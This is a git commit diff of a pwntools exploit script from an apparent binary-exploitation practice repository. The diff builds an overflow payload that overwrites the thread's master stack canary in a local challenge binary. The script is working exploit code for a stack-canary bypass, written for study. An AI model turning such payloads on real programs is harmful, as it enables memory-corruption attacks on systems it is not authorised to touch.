6f5ac00e721d8c6f7ccf1ec7777e160a7ae42651
ubuntu <lovehk2002@gmail.com>
2024-09-25 09:13:41 +0000

    update

--- System_Hack_Advanced/2.master_canary/Master_Canary/mc_thread.py
+++ System_Hack_Advanced/2.master_canary/Master_Canary/mc_thread.py
@@ -5,8 +5,10 @@ from pwn import *
 p = process('./mc_thread')
 e = ELF('./mc_thread')
 
-payload = b'A'*0x928
-
+payload = b'A'*0x910
+payload += p64(0x404800 - 0x972)
+payload += b'B'*0x10
+payload += p64(0x4141414141414141)
 int_sz = len(payload)
 p.sendlineafter(b'Size: ', str(int_sz).encode())
 p.sendafter(b'Data: ', payload)
